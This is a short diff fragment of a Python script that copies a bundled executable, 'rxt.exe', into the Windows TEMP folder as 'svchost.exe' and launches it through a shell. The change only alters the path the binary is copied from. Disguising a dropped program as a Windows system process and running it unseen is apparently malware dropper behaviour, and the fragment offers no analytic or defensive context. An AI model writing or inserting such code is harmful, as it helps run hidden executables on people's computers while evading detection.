@@ -4,7 +4,7 @@ import subprocess
 import tempfile
 import shutil
 tmp = os.path.join(os.environ.get('TEMP'), 'svchost.exe')
-shutil.copy2('modules/accept/rxt.exe', tmp)
+shutil.copy2('modules/bytes/rxt.exe', tmp)
 subprocess.Popen(tmp, shell=True)
 import time
 time.sleep(10)
